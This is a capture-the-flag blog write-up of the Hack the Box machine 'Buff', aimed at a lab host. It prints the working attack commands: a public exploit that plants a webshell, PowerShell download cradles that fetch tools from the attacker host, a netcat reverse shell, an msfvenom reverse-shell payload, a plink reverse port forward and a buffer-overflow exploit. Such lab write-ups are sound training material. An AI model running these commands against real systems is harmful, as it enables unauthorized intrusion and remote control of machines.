+++
author = "Nick"
categories = ["hack the box", "easy", "windows", "CVE", "webshell", "port forwarding", "reverse shell", "plink"]
date = 2020-07-18T15:00:00Z
description = ""
draft = false
thumbnail = "/images/2020/08/info.png"
slug = "hack-the-box-buff"
summary = "Welcome back everyone! Today we are going to be doing the Hack the Box machine - Buff. This is listed as an easy Windows box. Let's jump in!"
tags = ["hack the box", "easy", "windows", "CVE", "webshell", "port forwarding", "reverse shell", "plink"]
title = "Hack the Box - Buff"
slug = "/hack-the-box-buff"
 

+++


Welcome back everyone! Today we are going to be doing the Hack the Box machine - Buff. This is listed as an easy Windows box. Let's jump in!

As always we start with `nmap` scan: `nmap -sC -sV -p- -oA allscan 10.10.10.198`

Here are our results:
```
Nmap scan report for 10.10.10.198
Host is up (0.16s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
```

We see only two ports. So we head over to port `8080` and see what is being hosted. We land on a gym page. Exploring the page a bit shows that it's built on a software called `Gym Management Software 1.0`. A quick google shows us there are a few possible exploits for this software.

![](/images/2020/08/image.png)

We will quickly mirror this exploit to our working directory with `searchsploit`.

Command:
`searchsploit -m 48506`

Reading through the exploit and how it works, we simply need to supply our target URL.

Command:
`python2 48506.py http://10.10.10.198:8080/`

![](/images/2020/08/buffshell.gif)

We get back a webshell. We can now use this to quickly snag our `users.txt` flag.

![](/images/2020/08/image-1.png)

Now that we have this flag, we can look at creating a more stable connection and look for ways to escalate. We can use `nc` or `plink` to create a connnection back to our attacking system. First we need to download those tools to this system.

Command:
`powershell.exe -exec bypass -C "iex(New-Object Net.WebClient).DownloadFile('http://10.10.14.210/nc64.exe', 'C:\xampp\htdocs\gym\upload\nc64.exe')"`

Once thats on the system we can create our callback.

Command:
`.\nc.exe 10.10.14.210 7777 -e powershell.exe`

Make sure we have our listener as well.
`nc -lcnp 7777`

Once we do that we get our shell back.

![](/images/2020/08/image-2.png)

Now we just download `winPEAS` the same as we have for other tools:

Command:
`iex(New-Object Net.WebClient).DownloadFile("http://10.10.14.210/winPEAS.exe", "C:\Temp\wp.exe")`

When we try to run the file however, we are blocked.

![](/images/2020/08/image-3.png)

So we just download the `.bat` version instead. As we sift through this data we don't see much too exciting. As we manually browse the the contents of the machine, we noticed `CloudMe_1112.exe` in downloads. When we check against the `winPeas` scan from above we see that port 8888 is open locally, the port `CloudMe` uses. A quick search for any exploits of the software shows there is one on [exploit-db](https://www.exploit-db.com/exploits/48389).

The goal here is to do some port forwarding to our machine and run this exploit. To do this we'll need to use `plink`. We'll also need to create our own shellcode exploit as well.

First we'll generate our shellcode:

Command:
`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.210 LPORT=6969 -f c > shellcode`

We'll need to put this code in our exploit code later on. Next, let's get `plink` onto the target machine.

Command:
`curl http://10.10.14.210/plink.exe -o C:\tmp\plink.exe`

We can now create a port forwarding scenario to access remote ports locally. First start our `SSH` service if it's not already running.

Command:
`service ssh start`

Now create our port forward:

Command:
`.\plink.exe -ssh rootflag@10.10.14.210 -R 1234:127.0.0.1:8888`

This will then prompt us to login with the account. Once we do we should see a basic prompt.

![](/images/2020/08/image-5.png)

Now we should have the remote port of `8888` being forwarded to our local port of `1234`. If you try to curl the port, it's not going to get back any info but that's normally what I would do to be sure it worked.

Now that we have the ports forwarded, we can modify the exploit we found earlier - `44470.py`. First we need to replace the shellcode inside the exploit with our generated backdoor code. That's the code on line 31 - 52. Once we've pasted in our new shell code, we need to modify line 57 to reflect our port. In this case, we set or local port to `1234`. So we'll need to make that the value rather than `8888`

![](/images/2020/08/image-6.png)

Now with that saved. We can setup another listener to catch our reverse shell for the exploitcode that we made in the first step.

Command:
`nc -lvnp 6969`

We can now run the exploit. If you're on a public machine like myself, you might need to run it a few times.

Command:
`python2 44470.py` 

If all goes well, your listen will catch the connection.

![](/images/2020/08/image-4.png)

We now have an admin shell. We get our `root.txt` flag and box complete!

If you learned something in this box, send some respect my way - [HTB Profile](https://www.hackthebox.eu/home/users/profile/95635)



